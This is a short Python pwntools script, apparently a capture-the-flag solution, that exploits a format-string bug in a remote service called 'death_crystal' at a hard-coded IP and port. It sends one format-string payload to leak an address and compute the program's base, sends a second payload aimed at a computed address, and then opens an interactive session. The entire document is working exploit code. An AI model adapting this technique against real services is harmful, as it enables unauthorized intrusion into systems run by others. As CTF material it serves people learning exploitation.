#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('60.250.197.227', 10004)
#r = process('./death_crystal')
#gdb.attach(proc.pidof(r)[0])

r.recvuntil('Foresee:\n')
r.sendline('%1p' * 11 + ';%1p')
base = int(r.recvline().strip().split(b';')[1], 16) - 0xb20
print(f'base = 0x{base:x}')

r.recvuntil('Foresee:\n')
r.sendline(b'%d' * 8 + b'%100sAA\x00' + p64(base + 0x202060))

r.interactive()
